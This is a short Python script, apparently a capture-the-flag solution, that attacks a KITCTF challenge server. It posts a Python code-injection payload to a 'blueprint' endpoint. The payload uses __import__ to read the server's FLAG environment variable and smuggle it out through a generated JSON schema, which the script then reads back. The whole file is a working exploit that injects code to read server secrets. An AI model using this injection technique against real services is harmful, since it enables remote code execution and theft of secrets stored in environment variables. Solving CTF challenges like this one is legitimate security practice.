import requests
import string
import random
import sys
import json

target = "https://poached-truffle-dusted-with-dehydrated-soy-foam-2tu8.gpn24.ctf.kitctf.de"

name = ''.join(random.choices(string.ascii_lowercase, k=10))

payload = {
    "flag_exfil": "__import__('enum').Enum('E', {'A': __import__('os').environ['FLAG']})"
}

res = requests.post(f"{target}/blueprint/{name}", json=payload)
res = requests.get(f"{target}/blueprint/{name}")

schema = res.json()

flag = schema['$defs']['E']['enum'][0]
print(flag)